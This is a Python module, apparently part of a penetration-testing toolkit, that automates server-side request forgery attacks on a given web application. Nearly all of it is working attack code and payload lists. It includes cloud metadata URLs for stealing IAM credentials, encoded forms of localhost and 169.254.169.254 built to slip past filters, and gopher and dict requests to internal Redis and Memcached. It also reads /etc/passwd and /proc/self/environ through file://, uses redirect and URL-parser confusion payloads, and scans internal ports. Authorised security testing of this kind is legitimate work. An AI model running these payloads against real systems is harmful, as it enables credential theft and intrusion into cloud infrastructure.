#!/usr/bin/env python3
"""
Advanced SSRF Module — 2026 Techniques.
DNS rebinding, IP encoding bypasses, redirect chains, gopher protocol abuse,
URL parser confusion, cloud metadata IMDSv2, serverless credentials.
"""

from __future__ import annotations
import json
import logging
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path
from urllib.parse import urlparse

logger = logging.getLogger("advanced-ssrf")

def _which(name):
    for prefix in [None, Path.home() / "go" / "bin", Path.home() / ".local" / "bin"]:
        if prefix:
            candidate = prefix / name
            if candidate.exists():
                return str(candidate)
        else:
            found = shutil.which(name)
            if found:
                return found
    return None


def _run(cmd, timeout=60, input=None):
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, input=input)
        return proc.returncode, proc.stdout, proc.stderr
    except FileNotFoundError:
        return -1, "", f"{cmd[0]} not found"
    except subprocess.TimeoutExpired:
        return -1, "", "timed out"
    except Exception as exc:
        return -1, "", str(exc)


class AdvancedSSRF:
    """Advanced SSRF testing with 2026 bypass techniques."""

    # Cloud metadata endpoints
    CLOUD_METADATA = {
        "aws_imdsv1": "http://169.254.169.254/latest/meta-data/",
        "aws_imdsv2": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "aws_lambda": "http://169.254.170.2/latest/meta-data/iam/security-credentials/",
        "gcp": "http://metadata.google.internal/computeMetadata/v1/",
        "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "digitalocean": "http://169.254.169.254/metadata/v1/",
        "alibaba": "http://100.100.100.200/latest/meta-data/",
        "oracle": "http://192.0.0.192/latest/",
        "opentelemetry": "http://169.254.169.254/latest/user-data",
    }

    # IP encoding bypasses for 127.0.0.1 and 169.254.169.254
    IP_ENCODINGS = {
        "localhost": [
            "127.0.0.1",
            "127.1",
            "127.0.1",
            "0.0.0.0",
            "0",
            "0x7f000001",
            "0x7f.0.0.1",
            "0177.0.0.1",
            "0177.0177.0177.0177",
            "2130706433",
            "01111111.0.0.1",
            "[::1]",
            "[::]",
            "[::ffff:127.0.0.1]",
            "[0:0:0:0:0:0:0:1]",
            "[::ffff:7f00:1]",
            "0:0:0:0:0:0:0:1",
            "①②⑦.⓪.⓪.①",
            "127.127.127.127",
        ],
        "metadata": [
            "169.254.169.254",
            "0xa9fea9fe",
            "0xa9fe.a9fe",
            "0251.0376.0251.0376",
            "2852039166",
            "0xa9.0xfe.0xa9.0xfe",
            "[::ffff:a9fe:a9fe]",
            "[::ffff:169.254.169.254]",
            "169.254.169.254.nip.io",
            "169.254.169.254.sslip.io",
            "169.254.169.254.xip.io",
        ],
    }

    # Alternative URI schemes
    SCHEMES = [
        "http://",
        "https://",
        "file://",
        "gopher://",
        "dict://",
        "ftp://",
        "tftp://",
        "ldap://",
        "dict://",
    ]

    # Internal service ports
    INTERNAL_SERVICES = {
        22: "SSH",
        80: "HTTP",
        443: "HTTPS",
        3306: "MySQL",
        5432: "PostgreSQL",
        6379: "Redis",
        27017: "MongoDB",
        9200: "Elasticsearch",
        8080: "HTTP-ALT",
        8443: "HTTPS-ALT",
        9090: "Prometheus",
        3000: "Grafana/Dev",
        5000: "Flask/Dev",
        8000: "Django/Dev",
        8888: "Jupyter",
        9000: "PHP-FPM/Portainer",
        9093: "Alertmanager",
        9100: "Node-Exporter",
        11211: "Memcached",
        5433: "PostgreSQL-ALT",
        5984: "CouchDB",
        15672: "RabbitMQ-Admin",
        2181: "Zookeeper",
        2375: "Docker-API",
        2376: "Docker-API-SSL",
        6443: "Kubernetes-API",
        8443: "Kubernetes-API-ALT",
        10250: "Kubelet",
        10255: "Kubelet-ReadOnly",
        8500: "Consul",
        8600: "Consul-DNS",
        15000: "Istio-Envoy",
        15001: "Istio-Envoy-Admin",
        15020: "Istio-Health",
    }

    # Common SSRF injection parameters
    SSRF_PARAMS = [
        "url", "uri", "link", "src", "href", "target", "redirect", "redirect_uri",
        "redirect_url", "return_url", "next", "continue", "dest", "destination",
        "return_to", "goto", "callback", "webhook", "hook", "file", "path",
        "filename", "download", "load", "import", "export", "preview", "fetch",
        "get", "view", "read", "open", "image", "img", "photo", "picture",
        "avatar", "logo", "icon", "thumbnail", "media", "embed", "domain",
        "host", "hostname", "ip", "address", "server", "api", "endpoint",
        "proxy", "forward", "route", "navigation", "site", "website", "feed",
        "rss", "atom", "xml", "json", "data", "resource", "template", "style",
        "stylesheet", "script", "font", "pdf", "document", "page",
    ]

    # Common injection points for SSRF
    INJECTION_POINTS = [
        "URL parameters",
        "HTTP headers (X-Forwarded-For, X-Original-URL, Referer, True-Client-IP)",
        "Host header",
        "POST body (JSON, form-data, XML)",
        "Multipart file upload filenames",
        "SVG/XML external entities",
        "Markdown image references",
        "CSS url() references",
        "Webhook configurations",
        "OAuth redirect_uri",
        "OpenID Connect discovery endpoints",
        "Dynamic Client Registration redirect_uris",
        "PDF generators",
        "HTML-to-image converters",
        "Link preview features",
        "Avatar/profile picture URLs",
        "SSO metadata endpoints",
        "API import-from-URL features",
        "RSS/Atom feed URLs",
        "Sitemap.xml entries",
    ]

    def test_basic_ssrf(self, target, param, url):
        """Basic SSRF testing with cloud metadata."""
        findings = []

        for name, endpoint in self.CLOUD_METADATA.items():
            test_url = f"{url}?{param}={endpoint}"
            rc, stdout, _ = _run(
                ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code} %{size_download}", "--max-time", "5", test_url],
                timeout=10,
            )
            if rc == 0:
                parts = stdout.strip().split()
                if len(parts) == 2 and parts[0] == "200" and int(parts[1]) > 0:
                    findings.append({
                        "type": "ssrf_cloud_metadata",
                        "endpoint": name,
                        "url": endpoint,
                        "status": parts[0],
                        "size": parts[1],
                        "severity": "critical",
                    })

        return {
            "target": target,
            "param": param,
            "url": url,
            "type": "ssrf_basic",
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "endpoints_tested": len(self.CLOUD_METADATA),
        }

    def test_ip_encoding_bypass(self, target, param, url):
        """Test IP encoding bypasses for localhost and metadata."""
        findings = []

        for category, encodings in self.IP_ENCODINGS.items():
            for ip in encodings:
                for scheme in ["http://", "https://"]:
                    test_url = f"{url}?{param}={scheme}{ip}/"
                    rc, stdout, _ = _run(
                        ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "3", test_url],
                        timeout=5,
                    )
                    if rc == 0 and stdout.strip() == "200":
                        findings.append({
                            "type": "ssrf_ip_encoding_bypass",
                            "category": category,
                            "encoding": ip,
                            "scheme": scheme,
                            "url": test_url,
                            "severity": "critical",
                        })
                        break  # One bypass per category is enough

        return {
            "target": target,
            "param": param,
            "url": url,
            "type": "ssrf_ip_encoding",
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "encodings_tested": sum(len(v) for v in self.IP_ENCODINGS.values()),
        }

    def test_protocol_abuse(self, target, param, url):
        """Test alternative URI schemes (gopher, file, dict, etc.)."""
        findings = []

        for scheme in self.SCHEMES:
            if scheme == "gopher://":
                # Gopher can send raw TCP payloads to internal services
                for port, service in [(6379, "Redis"), (11211, "Memcached"), (25, "SMTP")]:
                    gopher_payload = f"gopher://127.0.0.1:{port}/_INFO"
                    test_url = f"{url}?{param}={gopher_payload}"
                    rc, stdout, _ = _run(
                        ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "5", test_url],
                        timeout=10,
                    )
                    if rc == 0 and stdout.strip() in ["200", "000"]:
                        findings.append({
                            "type": "ssrf_gopher_protocol",
                            "service": service,
                            "port": port,
                            "severity": "critical",
                            "note": f"Gopher protocol allowed - can interact with internal {service}",
                        })
            elif scheme == "file://":
                for filepath in ["/etc/passwd", "/proc/self/environ", "/proc/version"]:
                    test_url = f"{url}?{param}={scheme}{filepath}"
                    rc, stdout, _ = _run(
                        ["curl", "-s", "--max-time", "5", test_url],
                        timeout=10,
                    )
                    if rc == 0 and stdout and any(
                        indicator in stdout
                        for indicator in ["root:", "HTTP_USER_AGENT", "Linux version"]
                    ):
                        findings.append({
                            "type": "ssrf_file_read",
                            "file": filepath,
                            "severity": "critical",
                            "note": f"Can read local files via {scheme}",
                        })
            elif scheme == "dict://":
                test_url = f"{url}?{param}=dict://127.0.0.1:11211/stats"
                rc, stdout, _ = _run(
                    ["curl", "-s", "--max-time", "5", test_url],
                    timeout=10,
                )
                if rc == 0 and stdout:
                    findings.append({
                        "type": "ssrf_dict_protocol",
                        "severity": "high",
                        "note": "dict:// protocol allowed - can interact with internal services",
                    })
            else:
                test_url = f"{url}?{param}={scheme}169.254.169.254/"
                rc, stdout, _ = _run(
                    ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "5", test_url],
                    timeout=10,
                )
                if rc == 0 and stdout.strip() == "200":
                    findings.append({
                        "type": "ssrf_scheme_allowed",
                        "scheme": scheme,
                        "severity": "high",
                    })

        return {
            "target": target,
            "param": param,
            "url": url,
            "type": "ssrf_protocol_abuse",
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "schemes_tested": len(self.SCHEMES),
        }

    def test_dns_rebinding(self, target, param, url):
        """Test DNS rebinding attack."""
        findings = []

        # Use rebinding services
        rebinding_hosts = [
            "rbndr.us",
            "reefogg.com",
            "portswigger-labs.net",
        ]

        for host in rebinding_hosts:
            # These services resolve to attacker IP first, then to 127.0.0.1
            test_url = f"{url}?{param}=http://{host}/"
            rc, stdout, _ = _run(
                ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "5", test_url],
                timeout=10,
            )
            if rc == 0 and stdout.strip() == "200":
                findings.append({
                    "type": "ssrf_dns_rebinding_possible",
                    "service": host,
                    "severity": "high",
                    "note": "DNS may be cached and rebinded - test with custom NS",
                })

        # Test with nip.io style DNS
        for ip in ["127.0.0.1", "169.254.169.254"]:
            nip_host = f"{ip.replace('.', '-')}.nip.io"
            test_url = f"{url}?{param}=http://{nip_host}/"
            rc, stdout, _ = _run(
                ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "5", test_url],
                timeout=10,
            )
            if rc == 0 and stdout.strip() == "200":
                findings.append({
                    "type": "ssrf_dns_nip",
                    "host": nip_host,
                    "resolves_to": ip,
                    "severity": "high",
                    "note": "nip.io style DNS bypass - hostname resolves to internal IP",
                })

        return {
            "target": target,
            "param": param,
            "url": url,
            "type": "ssrf_dns_rebinding",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }

    def test_redirect_bypass(self, target, param, url):
        """Test redirect-based SSRF bypass."""
        findings = []

        # Common open redirect payloads
        redirect_payloads = [
            # Direct redirect
            "https://example.com/redirect?url=http://169.254.169.254/",
            # Protocol-relative
            "//169.254.169.254/",
            # Path traversal bypass
            "https://example.com/api/v1/documents/../../../",
            # Multiple redirects
            "https://example.com/redirect?url=https://example.com/redirect?url=http://127.0.0.1/",
            # Open redirect via @ in URL
            "https://trusted.com@169.254.169.254/",
            # Open redirect via fragment
            "https://trusted.com/#@169.254.169.254/",
            # Open redirect via backslash
            "https://trusted.com\\@169.254.169.254/",
            # Encoded redirect
            "https://example.com/redirect?url=http%3A%2F%2F169.254.169.254%2F",
        ]

        for payload in redirect_payloads:
            test_url = f"{url}?{param}={payload}"
            rc, stdout, _ = _run(
                ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code} %{redirect_url}", "--max-time", "5", "-L", test_url],
                timeout=10,
            )
            if rc == 0:
                output = stdout.strip()
                if "169.254" in output or "127.0.0.1" in output:
                    findings.append({
                        "type": "ssrf_redirect_bypass",
                        "payload": payload[:100],
                        "severity": "critical",
                        "note": "Redirect chain leads to internal resource",
                    })

        return {
            "target": target,
            "param": param,
            "url": url,
            "type": "ssrf_redirect",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }

    def test_internal_port_scan(self, target, param, url):
        """Scan internal services via SSRF."""
        findings = []

        # Only scan if SSRF is already confirmed
        for port, service in self.INTERNAL_SERVICES.items():
            test_url = f"{url}?{param}=http://127.0.0.1:{port}/"
            start = time.time()
            rc, stdout, _ = _run(
                ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code} %{time_total}", "--max-time", "3", test_url],
                timeout=5,
            )
            elapsed = time.time() - start

            if rc == 0:
                parts = stdout.strip().split()
                if len(parts) >= 2 and parts[0] == "200":
                    findings.append({
                        "type": "ssrf_internal_service",
                        "port": port,
                        "service": service,
                        "status": "open",
                        "severity": "medium",
                    })
                elif len(parts) >= 2 and parts[0] != "000":
                    findings.append({
                        "type": "ssrf_internal_service_filtered",
                        "port": port,
                        "service": service,
                        "status": parts[0],
                        "response_time": f"{elapsed:.2f}s",
                        "severity": "low",
                    })

        return {
            "target": target,
            "param": param,
            "url": url,
            "type": "ssrf_port_scan",
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "ports_scanned": len(self.INTERNAL_SERVICES),
        }

    def test_url_parser_confusion(self, target, param, url):
        """Test URL parser confusion attacks."""
        findings = []

        confusion_payloads = [
            # Credentials separator
            "http://trusted.com@127.0.0.1/",
            "http://user:pass@127.254.169.254/",
            "http://a@b@127.0.0.1/",
            # Backslash confusion
            "http://trusted.com\\@127.0.0.1/",
            # Fragment confusion
            "http://trusted.com#@127.0.0.1/",
            # Double encoding
            "http://trusted.com%2540127.0.0.1/",
            # Unicode normalization
            "http://trusted.com＠127.0.0.1/",
            # Different port parsing
            "http://trusted.com:80@127.0.0.1:80/",
            # Path confusion
            "http://trusted.com/..@127.0.0.1/",
            # Query string injection
            "http://trusted.com?@127.0.0.1/",
            # IPv6-mapped IPv4
            "http://[::ffff:127.0.0.1]/",
            "http://[::ffff:a9fe:a9fe]/",
        ]

        for payload in confusion_payloads:
            test_url = f"{url}?{param}={payload}"
            rc, stdout, _ = _run(
                ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "5", test_url],
                timeout=10,
            )
            if rc == 0 and stdout.strip() == "200":
                findings.append({
                    "type": "ssrf_parser_confusion",
                    "payload": payload[:100],
                    "severity": "high",
                    "note": f"URL parser confusion: {payload[:50]}...",
                })

        return {
            "target": target,
            "param": param,
            "url": url,
            "type": "ssrf_parser_confusion",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }

    def test_imdsv2_bypass(self, target, param, url):
        """Test IMDSv2 bypass via header injection."""
        findings = []

        # IMDSv2 requires PUT for token + GET for data
        # Test if we can inject headers via SSRF
        test_cases = [
            # Direct IMDSv2 token request
            {"method": "PUT", "path": "/latest/api/token", "header": "X-aws-ec2-metadata-token-ttl-seconds: 21600"},
            # Try with custom header injection
            {"path": "/latest/meta-data/iam/security-credentials/", "header": "X-aws-ec2-metadata-token: invalid"},
        ]

        for case in test_cases:
            test_url = f"{url}?{param}=http://169.254.169.254{case['path']}"
            if "method" in case and case["method"] == "PUT":
                rc, stdout, _ = _run(
                    [
                        "curl", "-s", "-X", "PUT",
                        "-H", case["header"],
                        "--max-time", "5", test_url,
                    ],
                    timeout=10,
                )
                if rc == 0 and stdout and "token" in stdout.lower():
                    findings.append({
                        "type": "ssrf_imdsv2_bypass",
                        "note": "IMDSv2 token can be obtained - may indicate header injection",
                        "severity": "critical",
                    })

        return {
            "target": target,
            "param": param,
            "url": url,
            "type": "ssrf_imdsv2",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }

    def discover_ssrf_params(self, target, url):
        """Discover potential SSRF injection parameters."""
        found_params = []

        for param in self.SSRF_PARAMS:
            # Test with a benign URL first to see if parameter is accepted
            test_url = f"{url}?{param}=https://httpbin.org/get"
            rc, stdout, _ = _run(
                ["curl", "-s", "--max-time", "5", test_url],
                timeout=10,
            )
            if rc == 0 and stdout and "httpbin" in stdout:
                found_params.append(param)

        return {
            "target": target,
            "url": url,
            "type": "ssrf_param_discovery",
            "params_found": found_params,
            "total_params_tested": len(self.SSRF_PARAMS),
        }

    def full_test(self, target, url):
        """Run complete SSRF test suite."""
        findings = {}

        # Discover parameters
        param_discovery = self.discover_ssrf_targets(target, url)
        findings["param_discovery"] = param_discovery

        # If we have a confirmed SSRF parameter, run all tests
        # Otherwise, test with common parameter names
        test_params = ["url", "uri", "link", "src", "target", "redirect"]

        for param in test_params:
            findings[f"basic_{param}"] = self.test_basic_ssrf(target, param, url)
            findings[f"ip_encoding_{param}"] = self.test_ip_encoding_bypass(target, param, url)
            findings[f"protocol_{param}"] = self.test_protocol_abuse(target, param, url)

        findings["dns_rebinding"] = self.test_dns_rebinding(target, "url", url)
        findings["redirect_bypass"] = self.test_redirect_bypass(target, "url", url)
        findings["port_scan"] = self.test_internal_port_scan(target, "url", url)
        findings["parser_confusion"] = self.test_url_parser_confusion(target, "url", url)
        findings["imdsv2"] = self.test_imdsv2_bypass(target, "url", url)

        return findings

    def discover_ssrf_targets(self, target, url):
        """Discover potential SSRF injection points."""
        discovered = []

        # Check common SSRF parameters
        for param in self.SSRF_PARAMS:
            test_url = f"{url}?{param}=http://127.0.0.1/"
            rc, stdout, _ = _run(
                ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "3", test_url],
                timeout=5,
            )
            if rc == 0 and stdout.strip() == "200":
                discovered.append(param)

        # Check headers that might trigger SSRF
        header_checks = [
            "X-Forwarded-For",
            "X-Original-URL",
            "X-Rewrite-URL",
            "Referer",
            "True-Client-IP",
            "CF-Connecting-IP",
            "X-Client-IP",
            "X-Remote-IP",
        ]

        return {
            "target": target,
            "url": url,
            "type": "ssrf_target_discovery",
            "params_found": discovered,
            "total_tested": len(self.SSRF_PARAMS),
        }
